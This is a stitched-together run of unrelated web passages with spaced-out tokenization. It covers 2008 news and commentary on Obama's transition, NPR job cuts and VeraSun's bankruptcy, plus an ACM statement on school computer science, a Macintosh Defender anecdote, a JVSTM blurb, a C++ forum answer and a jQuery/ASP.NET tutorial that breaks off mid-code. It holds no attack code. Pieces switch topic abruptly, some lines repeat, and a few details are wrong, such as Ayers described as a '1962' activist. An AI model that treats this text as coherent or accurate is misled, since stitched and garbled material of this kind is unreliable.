Tarini says these results reinforce the importance of using family history , not just genetic testing , to assess disease risk .
Methodology :
The study used data from a national online survey conducted in collaboration with Knowledge Networks , Inc .
The survey was administered to a random sample of 2,857 adults , ages 18 and older , who are a part of Knowledge Network ’s online KnowledgePanel® .
The sample was subsequently weighted to reflect U.S. population figures from the U.S. Census Bureau .
About three - fourths of the sample were parents .
As part of the online survey , parents received vignettes about their own and their youngest child ’s genetic risk , randomized as either a family history assessment or genetic test results .
Funding :
The research was supported by the U - M Clinical Science Scholars Program .
Authors : Along with Tarini , co-authors from the Division of General Pediatrics at U - M C.S. Mott Children ’s Hospital were Dianne Singer , M.S. ; Sarah J. Clark , M.P.H. ; and Matthew M. Davis , M.D. , M.A.P.P .

Events in the markets helped propel Barack Obama to a big win in America 's presidential election .
John McCain , Mr Obama 's Republican rival , was widely judged to have fumbled his response to the crisis .
Earlier , Mr Obama fought an epic battle with Hillary Clinton in the Democratic primaries .
Mrs Clinton was given the job of secretary of state in the Obama administration , which starts work on January 20th .
One of the new president 's top priorities will be to implement a stimulus package , the passage of which should be made easier by increased Democratic majorities in Congress .
Britain's Gordon Brown won plaudits for his handling of the financial crisis .
It had looked as though 2008 would be a dismal year for the prime minister .

The phrase “ Chicago Politics ” has been thrown around as an insult over the presidential campaign season .
Now that Chicago has become for the next two months the unofficial second US Capital , Chicago politics have dramatically increased in influence .
Agree or disagree with the negative connotations of the phrase , the reality is that if certain aspects of Chicago politics do make their way into the Obama administration , we might be looking at a bright future for green building .
Of course President Obama will inherit enormous problems , both at home and abroad , and no one expects him to place green building anywhere near the top of his priorities .
But a look at the green culture of Chicago and the philosophies of those on the short list to cabinet posts will reveal a potential national shift toward environmental building practices .
Chicago mayor Richard M. Daley has endeavored to make real his vision of Chicago as the greenest US city .
His Green Building Agenda , which was unveiled in 2005 , offered new green building standards , incentives , and education for builders and architects .
Daley is pushing for more green rooftops in Chicago , using the city ’s own City Hall as an example .
Earlier this year , Popsci.com published their list of the 50 greenest US cities .
Chicago came in at number 9 , but earned top marks for green building , awarding four city projects with a LEED Platinum rating .
Additionally , Daley has pushed for more bicycle accessibility and greater energy production with less carbon emission .
How will Chicago ’s focus on Green carry over into an Obama administration ?
Obama has already vowed to create five million new jobs in clean technologies and , when asked about what programs might be put on the back - burner , refused to back down on his promise of energy independence in ten years .
Daley ’s brother , Bill Daley , was the US Secretary of Commerce under Clinton and ran Al Gore ’s campaign .
He joined Obama ’s campaign as a senior advisor and was recently named to the advisory board of the Obama - Biden Transition Project .
While Bill Daley ’s background has been mainly in finance , his associations with his brother and Al Gore certainly up his green cred .
Some names tossed around for possible cabinet positions also could tilt the country toward sustainable , more energy efficient practices .
Robert F. Kennedy , Jr. has been mentioned as a possible head of the EPA or Secretary of the Interior .
Kennedy is a fierce environmental advocate and could ignite a national green building movement .
Robert Sussman , a member of the Environmental Law Institute , is another possible head of the EPA .
Arizona Governor Janet Nepolitano , a possible Attorney General , signed an executive order in 2005 requiring all state buildings to achieve at least LEED Silver status .
Chief of Staff Rahm Emanuel pushed for Chicago ’s Calumet Environmental Center , a LEED Platinum building highlighting the environmental importance of the Calumet wetlands .
Of utmost importance to green builders is Obama ’s actions to fix the current state of the economy .
With new home construction ground to a halt and the credit markets making home loans tougher to get , no amount of environmental good intentions will do any good without a stronger economy .
Perhaps Obama ’s choice for Secretary of the Treasury will have the most impact on the future of green building .

Too much of what 's called computer science in the public education system involves basic IT skills .
That 's one of the complaints about precollege education lodged by the Association for Computing Machinery in a statement on computer science in the K - 12 education system .
The ACM has listened to president - elect Obama discuss plans for improving and expanding education in science , technology , engineering and mathematics ( STEM ) , and wants to make sure computer science is n't left out .
But integrating computer science into earlier phases of education may be a longer - term challenge than the ACM 's statement indicates .
The ACM 's document lays things out right at the start , stating , " We believe that computer science education should be an integral part of our education system . "
Bobby Schnabel of Indiana University , who chairs the ACM's Education Policy Committee , elaborated on that theme in a statement announcing its release .
" Computing education benefits all students , not just those interested in pursuing computer science or information technology careers , " said Schnabel .
" But students often do not have many opportunities to engage in rigorous computer science study at the K - 12 level . "
The ACM points out that people with computing skills remain in demand on the job market , even as the number of students focusing on computer science has plunged in recent years .
Computer science is also doing very poorly at attracting participation from women and minorities .
Part of this may arise from problems with the public education system .
At the high school level , computer science courses are generally treated as optional or electives , rather than a college preparatory course .
Those who teach these classes have typically had a broad range of educational experience , and the certification programs are spotty , meaning that the course material and quality of instruction can be all over the map .
Partly as a result of this lack of standards , and partly as a result of a lack of public understanding of computer science , the ACM suggests that many classes bearing the label computer science simply are n't .
" The distinctions have blurred , " the report suggests , " between what is called computer science and what is , in fact , information technology literacy and the use of technology to support learning . "
The solution , according to the ACM , is to treat computer science as a core part of a modern education .
Detailed instruction should start at the junior high school level , as that 's where long - term interests are frequently fostered .
Studies should determine how students wind up engaging with the field , and the education and certification of teachers , as well as the course design , should be revamped in accordance with the results of these studies .
In general , I support efforts to improve STEM education , and I 'm certain the ACM is right in suggesting that there is plenty of room for improvement in CS education .
Nevertheless , it seems that the ACM is running the risk of overstating its case .
" Computer science also provides an important skill set for students entering any career area , " the statement reads .
This is true to the extent that basic math and logic skills , as well as an organized approach to problem solving , should be part of any general education .
But a lot of actual computer science involves the development of skills that are significantly abstracted from , and far more specialized than , these basic skills .
Teaching skills like logic and problem solving are only generally useful if the instruction includes some way of relating those skills to issues outside the field ; any revamp of computer science instruction would need to ensure that it does that .
This is n't an insurmountable problem , but it does suggest that the restructuring of the CS education process may be more challenging and take longer than the ACM might like .
But the group also neglected to make the case for one of its major claims .
The document correctly draws a distinction between basic , IT - level computing skills and actual computer science education , but neglects to discuss the relative value of the two .
Education has often focused on the former , because it 's perceived by many in the public as being the more important skill .
If the ACM really wants an emphasis on the latter , it 's going to have to try harder to convince the public of that perspective .
VeraSun Energy , the second - largest producer of corn- based ethanol in the United States has run out of money and filed for bankruptcy protection .
The South Dakota - based company said in a court filing on Monday that it would n't be able to make this week 's payroll without help and also needs money to buy corn , natural gas , and pay its leases and other expenses .
Verasun lost $ 63 m to $ 103 m when attempting to hedge risks in the corn market , Bloomberg reports .
This summer , VeraSun had agreed to purchase corn at a fixed price of $ 6.75 to $ 7 a bushel when Midwest flooding sent grain prices sky - rocketing .
But the flood damage was n't as bad as anticipated , and combined with worldwide economic slowdown , corn futures settled back down to $ 4 a bushel .
The credit crisis also found VeraSun unable to secure funding needed to pay the interest on its debt .
" Today 's filing allows VeraSun to address its short - term liquidity constraints as we navigate historically challenging market conditions while we focus on restructuring to address the company 's long - term future , " company CEO Don Endres said in a statement Friday .
In its SEC filing , VeraSun claims $ 3.45 bn in assets and $ 1.91 bn in debt .
Ethanol investments gained much of its legitimacy when the uber - nerd himself , Bill Gates bought a $ 84 m stake in Pacific Ethanol in 2006 .
But the former Microsoft chief later started selling off the shares , taking a big financial hit to get the hell out of Dodge . ®
The Original Macintosh : 83 of 127 Make a Mess , Clean it Up !
Author : Donn Denman Date : September 1983 Characters : Burrell Smith , Donn Denman , Andy Hertzfeld Topics : Personality , Recreation Summary : Burrell had a unique approach to playing Defender Defender was Burrell 's favorite
video game Working 90 hours a work week requires frequent , and highly effective , work breaks .
In the center of Macintosh work area in Bandley 3 we had a ping pong table , a nice stereo system , and a Defender video game machine .
We found that competitive play gave us a jolt of adrenaline , and a refreshed mind - set when we resumed work .
We also learned a lot about our coworkers and how they excel during competition .
While playing Defender one day I got some great insight into how Burrell accelerates his own learning process .
Andy , Burrell and I had a standing competition playing on the Defender machine .
We 'd challenge each other , in two or three player competitions , taking turns at the video game machine , and compare techniques and high scores .
We were roughly equal in skill level , so as we'd take turns at the controls we could watch how the other player was doing , and have a gauge for who was ahead .
This gave us opportunities to refine our skills , learn the other guy 's technique , and show off our prowess .
The goal of Defender is to defend your humans from abduction by aliens .
The evil green aliens drop down from the top of the screen and randomly pick up your humans , and try to bring them back up to the top of the screen .
You control a ship and have to shoot the aliens , either before they grab a human , or during their rise up to the top of the screen .
If an alien makes it to the top with a human , they consume him and become a vicious mutant , which attacks very aggressively .
You start the game with ten humans , and if the last one dies , all the aliens become mutants , and they swarm in on your ship from all sides .
After a while , surviving the first few game levels was pretty easy , unless you had been up all night programming or something .
The Defender machine was probably a pretty good objective measure of current mental capacity .
" Gee , I can't even get through level 2 !
I guess it 's time to get some sleep . "
Better to put in a bad performance on the defender game than mess up the current programming task , or start down the wrong path on some hardware design .
We started up a new competition , and when Burrell 's turn came up , he did something that stunned me .
He immediately shot all his humans !
This was completely against the goal of the game !
He did n't even go after the aliens , and when he shot the last human , they all turned to mutants and attacked him from all sides .
He glanced in my direction with a grin on his face and said " Make a mess , clean it up ! " and proceeded to dodge the swarm of angry mutants noisily chasing after him .
" Burrell 's not going to win this competition " I said to myself .
" He 's not going to last long with a screen full of mutants ! "
Often a single mutant is enough to kill you .
They move quicker , and with a different pace and pattern than the other aliens , so the normal evasive techniques do n't work very well .
Mutants move so quickly over small distances that they seem to just jump on top of you .
Your ship is faster over the longer term , so you have to outrun them , establishing a gap , and only then do you have enough room to safely turn and fire at them .
When Burrell 's next turn came up I was surprised by how long his ship survived .
He 'd already developed a technique for dealing with a whole mass of mutants .
He would circle around them again and again , and that would gather them into a densely clumped swarm .
Then , while circling , he'd fire a burst pattern across the whole swarm , not needing to aim at individuals .
He was doing really well , cutting through the swarm like the Grim Reaper 's scythe .
Burrell was no longer attacking individual mutants , instead he was treating the whole swarm as one big target .
Burrell may have lost that game and the next few , but it was n't too long before he was really mastering the machine .
Instead of avoiding the tough situations , he 'd immediately create them , and immediately start learning how to handle the worst situation imaginable .
Pretty soon he would routinely handle anything the machine could throw at him .
I was beginning to see how Burrell could be so successful with everything he does .
Like many high achievers , Burrell likes challenges so much that he actually seeks them out and consciously creates them .
In the long run , this approach makes sense .
He seems to aggressively set up challenging situations throughout his life .
Then , when life throws him a curve ball , he 'll swing hard , and knock it out of the park .
Why intentionally " make a mess ? "
So you can get really good at " cleaning up ! "

One day Burrell started doing something radical .
Andy came by my cube and said " You 've got to come see what Burrell 's doing with Defender . "
" How can you innovate with a video game ? " I wondered .
I 'd seen Burrell and Andy innovate on all kinds of things , but I could n't image how he could somehow step outside the box of a video game - the machine controlled the flow and dictated the goals .
How could you gain some control in that environment ?
We started up a new competition , and when Burrell 's turn came up , he did something that stunned me .

Welcome to the JVSTM project
The JVSTM ( Java Versioned STM ) is a Java library implementing our approach to STM ( Software Transactional Memory ) , which introduces the concept of versioned boxes .
The Java Versioned Software Transactional Memory ( JVSTM ) is a pure Java library implementing an STM ( 1 ) .
JVSTM introduces the concept of versioned boxes ( 2 ) , which are transactional locations that may be read and written during transactions , much in the same way of other STMs , except that they keep the history of values written to them by any committed transaction .
Since version 2 the JVSTM implementation is entirely non-blocking ( 3 ) .

In 1958 , as part of the dedication ceremony for a new elementary school , a group of students is asked to draw pictures to be stored in a time capsule .
But one of the students , a mysterious girl who seems to hear whispered voices , fills her sheet of paper with rows of apparently random numbers instead …
“ Knowing ” opens to theatres on March 20th , 2009 .
I agree with most posts there : C++ is a multi- paradigm language , so the " hidden " features you 'll find ( other than " undefined behaviours " that you should avoid at all cost ) are clever uses of facilities .
Most of those facilities are not build - in features of the language , but library - based ones .
The most important is the RAII , often ignored for years by C++ developers coming from the C world .
Operator overloading is often a misunderstood feature that enable both array - like behaviour ( subscript operator ) , pointer like operations ( smart pointers ) and build - in - like operations ( multiplying matrices .
The use of exception is often difficult , but with some work , can produce really robust code through exception safety specifications ( including code that wo n't fail , or that will have a commit - like features that is that will succeed , or revert back to its original state ) .
The most famous of " hidden " feature of C++ is template metaprogramming , as it enables you to have your program partially ( or totally ) executed at compile - time instead of runtime .
This is difficult , though , and you must have a solid grasp on templates before trying it .
Other make uses of the multiple paradigm to produce " ways of programming " outside of C++'s ancestor , that is , C .
By using functors , you can simulate functions , with the additional type - safety and being stateful .
Using the command pattern , you can delay code execution .
Most other design patterns can be easily and efficiently implemented in C++ to produce alternative coding styles not supposed to be inside the list of " official C++ paradigms " .
By using templates , you can produce code that will work on most types , including not the one you thought at first .
You can increase type safety , too ( like an automated typesafe malloc / realloc / free ) .
C++ object features are really powerful ( and thus , dangerous if used carelessly ) , but even the dynamic polymorphism have its static version in C++ : the CRTP .
I have found that most " Effective C++ " - type books from Scott Meyers or " Exceptional C++ " - type books from Herb Sutter to be both easy to read , and quite treasures of info on known and less known features of C ++.
Among my preferred is one that should make the hair of any Java programmer rise from horror :
In C++ , the most object - oriented way to add a feature to an object is through a non-member non-friend function , instead of a member - function ( i.e. class method ) , because :
In C++ , a class ' interface is both its member - functions and the non-member functions in the same namespace
non -friend non-member functions have no privileged access to the class internal .
As such , using a member function over a non-member non-friend one will weaken the class ' encapsulation .
This never fails to surprise even experienced developers .

As the Obama transition continues , there ’s much speculation as to whom the president - elect will ask to head the Pentagon and whether he might invite Robert Gates to stay on .
Less attention , however , has been paid to a critical , but related , issue : Will Gates or his successor be able to make good on Obama ’s promise to cut “ tens of billions of dollars in wasteful spending ” from the military budget ?
On the campaign trail , Obama frequently cautioned that changing the federal government will not be easy .
Perhaps nowhere will this be truer than in the Pentagon ’s ossified bureaucracy .
Reforming it may be the toughest job in Washington .
In pursuing this mission , Obama and his man ( or woman ) at the Pentagon will face opposition from entrenched interests in the uniformed military and private industry , as well as on Capitol Hill .
The Pentagon is used to getting what it wants , as evidenced by its recent spending spree .
The “ base ” defense budget , which excludes the expense of the wars in Iraq and Afghanistan , has grown 40 percent since 2001 to an estimated $ 518.3 billion requested for fiscal year 2009 .
But this does n’t tell the whole story .
If you figure in other military expenditures , such as those incurred by the departments of Homeland Security , Energy , Veterans Affairs , and the numerous defense “ supplemental ” bills that the Bush administration has relied on to fund its foreign adventures , US defense spending stands at a staggering $ 863.7 billion .
This exceeds the collective annual defense spending of the world ’s militaries combined .
The issue , though , is not only how much the Pentagon is spending , but the bang it ’s getting for all these bucks .
Much of its budget is tied up in big - ticket , high - tech weapons programs , such as the Air Force ’s F - 22 fighter , the Army ’s “ Future Combat Systems ” program , and the Navy ’s next - generation fleet of destroyers and coastal combat vessels .
All of these programs are behind schedule and over budget — and of questionable relevance to the needs of today ’s military .
Take the F - 22 .
The Air Force , which began developing the fighter in 1986 , originally intended to buy more than 700 of them to replace its aging fleet of F - 15s and F - 16s .
By 2000 , cost overruns led the Pentagon to halve its order to 346 .
But in 2005 , almost 20 years and $ 40 billion later , the request was lowered again to just 180 aircraft , the consequence of lengthy delays and unanticipated development costs that had pushed the price per airplane from an earlier projection of $ 184 million to $ 355 million .
To fill the void in inventory , the Air Force has now begun developing the F - 35 Joint Strike Fighter , which critics say promises a repeat of the F - 22 fiasco .
“ The last I heard , Al Qaeda does n’t have an air force , ” says Winslow Wheeler , director of the Straus Military Reform Project at Washington ’s Center for Defense Information and the editor of the forthcoming book America ’s Defense Meltdown : Pentagon Reform for President Obama and the New Congress .
The F - 22 , which he describes as a “ dog ” on performance ( more fragile and less maneuverable than Vietnam - era fighters ) , “ is ridiculously expensive , and its huge cost prevents you from buying a respectable inventory of them . ”
But focusing on individual boondoggles like the F - 22 is not the solution , says Wheeler .
Instead , if Obama hopes to switch things up , he and his aides must understand that cost overruns and development delays at the Pentagon are not the exception but the rule .
“ I ’m all for getting rid of the garbage , but if we simply trot out a cut list , we ’re going to get killed , ” Wheeler says .
“ The advocates [ for each weapons program ] inside the Pentagon will go on full alert .
They ’ll activate their porker friends inside Congress , and that will be the end of it . ”
Rather , he suggests , change rests on getting decision makers the real , unvarnished information they need to grapple with structural problems inherent in the defense acquisitions system .
Getting that information is not as easy as it might seem .
According to retired Marine Lt. Colonel John Sayen , a former Pentagon analyst , the Defense Department ’s procurement bureaucracy is practiced at pushing its wish list through Congress “ by downplaying costs and / or exaggerating benefits ” and “ quickly building a support network of vested interests to lock in a front - loaded decision before its true costs or performance become apparent . ”
In other words , military procurement is an institutionalized scam .
Even when problems surface , Congress rarely interferes .
Assembly of the F - 22 alone involves spending in 44 states , says Wheeler , and “ people on Capitol Hill are leaving drool trails in the hallways to buy more . ”
Still , there are signs that some in the Pentagon understand that the free - spending days of the past may be ending .
The Defense Business Board , a Pentagon advisory panel that includes about 20 private - sector executives , recently prepared a series of briefings for the incoming Obama administration , highlighting the Defense Department ’s runaway budget and acknowledging that it cannot continue .
“ All indications are that Department is entering a prolonged period of fiscal constraint in a tough economy with deficits increasing and competitive spending pressures , ” one of the briefing documents reads .
“ Business as usual is no longer an option .
The current and future fiscal environments facing the Department demand bold action . ”
Will the Obama administration be the one to provide it ?
The forces of status quo are well positioned within the Pentagon and Congress , so much will depend on whether Obama picks a Pentagon chief who is willing to take on the bureaucracy while the nation is still prosecuting two wars .
Among the people rumored to be in line for the job is Richard Danzig , who served as secretary of the navy during the latter years of the Clinton administration .
While in that position , Danzig did not earn a reputation as an opponent of Pentagon bloat .
“ He was a mess as secretary of the Navy , ” says Wheeler .
“ That ’s not the kind of help President Obama will need to clean out the stables . ”
The question remains , when Obama ’s agenda of change meets the Pentagon , which side will win out ?
National Public Radio , citing an unexpected revenue shortfall , said Wednesday that it would cut 64 jobs , or about 7 percent of its work force of 889 , and would cancel two weekday programs , “ Day to Day ” and “ News & Notes . ”
The cutbacks , which come even as NPR is reaching what it said is a near - record audience of 26.4 million listeners a week , include 22 employees at the canceled programs , which will end March 20 ; six reporters and correspondents elsewhere ; and one digital media position .
In addition to the job cuts , 21 open positions will not be filled .
Expenses will be reduced in reporting , production , station services , communications , administration and travel , and NPR will also draw on its operating reserves to make up for what is expected to be a $ 23 million revenue shortfall , leaving it with projected revenue of $ 145 million in the fiscal year ending next September .
NPR was projecting a $ 2 million deficit in July when the budget was approved , and , citing the economic slowdown , it canceled the fledgling morning program “ The Bryant Park Project . ”
Since then , as the economy worsened , corporate sponsorships in particular have dropped precipitously , to a projected $ 33 million for the year instead of the $ 47 million budgeted , NPR executives said .
It should n’t come as a huge surprise that if the world could vote in the American elections , Barack Obama would be the winner .
The world at large – with the possible exception of al Qaeda who ardently champion McCain ’s candidacy – is sick to the back teeth of Bush , his policies , his wars and his Doctrines .
But what is a bit unusual is the degree of Obamamania sweeping the world , with hope , with excitement , with jubilation .
For the most part the world is looking forward to Change with a capital O .
So , at a time when American standing in the world has hit an all - time low , a small taste of what Obama could bring about and restore America ’s reputation , a selection of excepts from comments around the world , and please feel free to add a few from your own neck of the woods , should you happen to be outside the borders of the Land of the Free and Home of the Brave :
From New Zealand :
… I tried to donate some money to his election campaign .
This day he was asking everyone to send $ 5 .
I figured that was n't too much to pay to ensure that I could turn on CNN and see more of the man I love , rather than John McCain , who looks two seconds away from a coronary .
Unfortunately I was prevented from doing so because you had to prove you were a United States citizen to cough up .
Americans may not be afraid of the Taleban , but apparently the thought of my foreign influence on their president is too much to take .
Obama is a truly different kind of leader , not just because he is hot - although , Lord knows , that is quite a change - but because you know he has an open mind and has been exposed to new ideas all his life .
I like the fact that the leader of the free world has seen some of the whole world and experienced different cultures , rather than emerging from a large piece of snow with a nice view of Russia .
I like the fact that Obama has talked and associated with Bill Ayers , the 1962 anti-war activist .
He might be extreme but his insights into the $ 200 b
Iraq war effort might be worth listening to .
From Australia :
“ New York or Durham ? " asks Larry the " visibility co-ordinator " .
When we reply " Sydney " he is startled .
" What , all of you ? " he asks .
" Yes , all of us , " we reply .
How eight Australians have ended up in the tiny city of Portsmouth , New Hampshire , volunteering for the last eight days of the Obama campaign is a long and complicated tale - but here we are .
We repeat our story many times but they still marvel … an American friend had , over dinner , invited us to campaign with him in New Hampshire .
My sister and I replied " yes " immediately and the troupe of volunteers grew , eventually including my other sister from Melbourne .
There are other international volunteers around .
So far we have met a Swede and a Welshman .
The cries of amazement that greet our group seem to be based on the fact that there are so many of us and we have come so far .
Americans seem to think that Australia is in some other universe and that spending 24 hours in a plane is medieval torture .
They are strange people but they deserve a really good president .
So does the rest of the world .
From India :
… while there is no certainty that Obama ’s approach of opening diplomatic channels with Iran alongside the threat of targeted sanctions would work , it would be a welcome break from the current administration ’s policies …
He has advocated greater accountability and conditionality when it comes to aid for Pakistan as well as bolstering its democratic institutions .
McCain , given past support for Pervez Musharraf and his apparent reluctance to apply pressure on Asif Zardari ’s government , seems more inclined to that old US approach , expediency …
With a resurgent Russia , belligerent Iran and global financial meltdown , a deliberate , multilateral approach is essential .
It explains the enthusiasm worldwide for an Obama presidency .
That seems to include most Indians .
From Canada :
A massive majority of Canadians would like to see Senator Barack Obama win the American presidential election to be held on November 4 , 2008 according to a new national poll of 2,025 Canadians conducted by Environics Research .
This continues a pronounced trend among Canadians over the past decade toward favouring Democratic presidential candidates over Republicans .
The survey shows that seven in ten Canadians ( 69 % ) would most like to see Democratic Party candidate Barack Obama win the election , compared to just 15 percent who would prefer to see Republican John McCain win the election .
Another 13 percent have no opinion or do not favour either candidate , and two percent volunteer other candidates .
From France ( Le Monde ) :
Aucun hésitant , aucune voix discordante , parmi eux .
Ils ont 15 , 18 , 20 ans .
Ils habitent les " Pâquerettes " , une cité de la banlieue parisienne , à Nanterre ( Hauts - de - Seine ) .
Et , ce vendredi 31 octobre , à quatre jours de l'élection présidentielle américaine , le scrutin n'a plus qu'un seul visage , au pied de leurs barres : celui de Barack Obama …
( No hesitation , no discordant voice among them .
They are 15 , 18 , 20 years old .
They live in the " Pâquerettes " , in a Parisian suburb , in Nanterre in the Hauts - de - Seine .
And this Friday , October 31 , with four days to go before the American presidential election , they are looking only for one face , one foot on the pedal , that of Barack Obama . )

Michele G: J'ai vote !
Je viens de voter a San Diego ( on peut voter en avance ) !
Je suis citoyenne americaine depuis 44 jours et je suis heureuse de pouvoir participer a ce vote historique .

Maybe I ’m being pessimistic , but it makes me nervous how McCain is climbing in any polls . )
Two weeks to go !
Go Barack , go !!!
From the UK :
Foreign volunteers are not uncommon : I am one of three in this office from Britain , and there are two from Denmark .
My listening material is public radio and my coffee comes from a Bill of Rights mug .
When the cup is filled , the rights lost under President Bush 's Patriot Act disappear .
I am about to spend a week with the greatest grassroots political organisation in American election history : Me : “ Hello , my name is Tom and I work on the Obama campaign .
Can I talk to you about voting by post ? ”
Voter : “ Hey , you know what ?
I 've already had a couple of calls explaining it . ”
Me : “ Awesome ! ” ( American enthusiasm is infectious )
“ And have you made up your mind about the election ? ” Voter : “ Well , I 've actually been canvassing with you guys . ”
Pause .
“ And my brother was a Democrat senator .
Also , in the US we call it ' voting by mail ' , not ' by post ' . ”
The area is a mix of immigrant communities .
El Mexicana minimart sits beside the New Saigon restaurant and Paul Lopez , the local councilman , proudly tells me that they have a mosque and a Buddhist temple .
His card is translated into Vietnamese .
Opposite his offices , a shabby bungalow flies the US flag at half mast .
Mr Jenkins tells me that they are probably a “ gold - star family ” , with a son killed in Iraq or Afghanistan .
“ It 's my job to get all these people here to vote , ” he says .
“ I do n't pretend that with Obama things will change overnight : I know expectations are too high .
But after eight years of Bush , we can't let our country down for another term . ”
And another :
At 109 , Amanda Jones is too frail to go to the polls on Tuesday , so she voted early by post last week .
Her father was born a slave in Texas and herded sheep until he was freed at the age of 12 .
She cast her ballot for Barack Obama .
“ I feel good about voting for him , ” Jones said .
Her family helped her to obtain an absentee ballot .
“ It ’s awesome to me that we have such a pillar of our family still with us , ” said Brenda Baker , her 44 - year - old granddaughter .
“ It ’s awesome to see what she ’s done , and all her hard work , and to see that she may be able to see the results of that hard work . ”
The Obama campaign has identified a new species among this voting block – the “ sporadic voter ” , who generally does n’t bother to turn out for elections but appears to be making an exception for this one .
The electoral and demographic map of America is shifting in ways that will be fully understood only as the votes are counted – and the world is helping to give it a shove .
British supporters have been flocking to join Obama ’s volunteers .
Tony Underwood , a history student at Nottingham University , has been campaigning for Obama in Pennsylvania .
“ Barack Obama is an inspirational figure .
What happens here will cross the Atlantic , ” he predicted .
“ Everybody who volunteers feels that they are part of something great , that this is their campaign .
People believe they can influence politics . ”
From Argentina :
Latinamericans prefer Obama over McCain three to one .
The poll which covers 18 countries of the region with 1.000 to 1.200 interviews per country to adults over 18 with an error margin of 2.8 to 3 percentage points shows that 40 % of Latinamericans declare to know about , and follow the US presidential election .

In the first part of this article series I introduced jQuery ’s functionality and how it provides a rich client side programming model .
This time around I ’ll expand on these concepts and show you how you can use jQuery in combination with ASP.
NET using it as an AJAX backend to retrieve data .
I ’ll also discuss how you can create ASP .
NET controls and otherwise interact with jQuery content from ASP .
NET pages in WebForms .
jQuery is just a JavaScript library so it will work seamlessly with ASP.
NET both from page code as well as through backend driven code using the Page .
ClientScript object or ScriptManager .
You can use jQuery on its own as a client side and Ajax library that communicates with ASP.
NET or you can use jQuery in combination with ASP .
NET AJAX .
The two actually complement each other quite well as jQuery provides functionality that the ASP .
NET AJAX library does not and vice versa .
For the most part the interaction between the two libraries is trouble free except for a few very rare edge cases .
In this article I ’m not going to be talking much about ASP .
NET AJAX since that ’s been covered ad finitum in other places – the procedure does n’t vary much if you ’re using it with jQuery .
Instead I ’ll focus on using only jQuery plus a few small helpers to make callbacks to the server easily .
In the process you ’ll get to see how some of jQuery ’s AJAX features work and how to manage the data coming back from the server in a few different ways .
First Ajax Steps with jQuery
One of the most obvious client side features of any Javascript client library is the ability to make AJAX calls to the server .
j Query includes a host of Ajax functions that make it easy to retrieve content from a Url starting with the low level and do - everything $ .ajax ( ) function plus a number of others that are simpler and more focused to specific tasks .
Here ’s a list of some of the functions available : $.ajax ( opt )
This the low level Ajax function with many , many options that lets you create just about any kind of Ajax request .
If you need full control over requests or you want to create a generic component that calls back to the server ( like the WCF / ASMX client proxy I ’ll discuss later ) you ’ll want to use this function .
For now check out the documentation on the multitude of options available .
$ ( sel ) .load(url , data , callback )
The .load ( ) function is the only Ajax function that works off a jQuery selector .
It calls a URL on the server and loads the result as content into selected element ( s ) .
It ’s a very quick and easy way to load Html fragments and inject them into the document if your result is HTML .
An optional callback can be provided to be notified with the server result text when the callback completes which is useful if you want to visually adjust the retrieved content – like applying an effect to visually cue the user to an update .
Note this function is heavily overloaded :
If no URL is specified .load ( ) acts as a load event handler that fires when an element has loaded its data ( ie. an image or script ) .
$.get (url , callback ) , $.post ( url , data , callback )
These functions are simple helpers that provide basic get and post operations to the server .
You specify a URL and a callback which is called with the HTTP response from the server .
$. post ( ) also allows you to pass either formatted POST buffer string or an object the properties of which are turned into POST encoded key value pairs .
$.getJSON(url , data , callback )
Similar to $.post ( ) , but expects the result to be JSON which is automatically deserialized into a Javascript value and passed to the callback as a parameter .
While this function is handy for simple JSON results there are two things to watch out for :
Dates are not parsed since there ’s no date literal in Javascript , so whatever the server returns will be used ( typically a string ) .
$.getJSON ( ) also does n’t support JSON POST data – only POST encoded variables .
This function is useful for simple JSON results returned from arbitrary services , but not usable for calling WCF or ASMX ASP.
NET services since they expect JSON POST input .
More on this later in the article .
.getJSON ( ) also supports cross domain JSONP callbacks .
If you specify a query string parameter of callback= ?
you can force the result to be routed to the callback you specify in the parameter list .
$.getScript(url , callback )
This function loads script code from the server and executes it once downloaded if no callback is specified .
If specified the optional handler is fired instead and passed the Javascript , plus the current ajax request .
This can be useful for JSONP cross domain callbacks where you have no control over the parameters used .
Global Ajax Events
There also a number of global Ajax events that you can take advantage of all of which take callbacks as parameters : ajaxCallback ( ) , ajaxError ( ) , ajaxSend ( ) , ajaxStart ( ) , ajaxStop ( ) , ajaxSuccess ( ) .
These are useful for setting up global handlers that can centrally manage Ajax requests .
You ’re not likely to need these much unless you build components that need to know status of requests .
Getting started with $ ( ).load ( )
The load ( ) function is the easiest way to retrieve content from the server and display it .
Let ’s look at a simple stock quote example from the included code samples .
It retrieves a stock quote from Yahoo and displays the results using the .load ( ) as shown in Figure 1 .
Figure 1 : A simple example loading a stock quote as HTML with the .load ( ) function .
This page works by utilizing two HTML pages :
One to hold the input form ( StockAjaxLoad.aspx ) and one to display the actual stock chart ( StockDisplay.aspx ) .
The StockDisplay form is a standalone server page that renders an HTML fragment and is one that is called from jQuery to return the fragment with the completed stock data .
The stock display form can be accessed simply via query string parameters by providing a symbol name , or providing an action =
Chart key value pair to renders the stock chart image .
The two Urls the form accepts look like this : StockDisplay.aspx?Symbol=msft StockDisplay.aspx?Symbol=msft&action=Chart
The form itself is a plain server form with a few label controls .
The codebehind loads up a stock quote by using a StockServer class that goes out to Yahoo from the server and retrieves stock data , parsing it into a stock quote object .
The resulting quote data is then assigned to the label fields .
The page is not a full HTML document but rather just a fragment that starts with a < div > tag and < table > - there ’s no < html > or < body > tag since the output will be merged into the existing document .
Check out and test the StockDisplay . aspx to see how the display and stock retrieval works .
The key part of the client page contains only the form fields and a placeholder is very simple and looks like this : < div class= " containercontent " >
Stock Symbol : < asp : TextBox runat=" server " ID = " txtSymbol " Text =" MSFT " /> < input type=" button " id =" btnSubmit " value = " Get Quote " onclick = " showStockQuote ( ) ; " /> < img src= " ../images/loading_small.gif " id =" imgLoading "
style = " display : none " /> < hr /> < div id =" divResult " style = " width :420 px " ></div > </div >
To load a stock quote with jQuery we can now very easily read the symbol and use the .load ( ) function to load the result into divResult .
< script type =" text / javascript " > function showStockQuote ( ) { $ ( " #divResult " ) .load ( " StockDisplay.aspx " , { symbol : $ ( " #txtSymbol " ) .val ( ) } ) ; } </script >
That ’s it !
We call .load ( ) with the URL plus the optional data parameter which can be either a string ( a raw POST buffer ) or an object map , the properties of which turn into POST parameters .
Here I ’m passing an object with a single symbol property that is turned into a POST var .
On the server form the StockDisplay . aspx fragment page code simply picks up the symbol , retrieves the stock quote and updates the HTML display and renders the page .
Listing 1 shows the StockDisplay codebehind that handles both the stock display and stock chart image .
Listing 1 : The StockDisplay codebehind loads a quote and displays it public partial class StockDisplay : System .
Web.UI .
Page { protected void Page_Load ( object sender , EventArgs e ) { string action = Request .
Params [ " Action " ] ; if ( action == " Chart " ) this .
GetStockChart ( ) ; this .
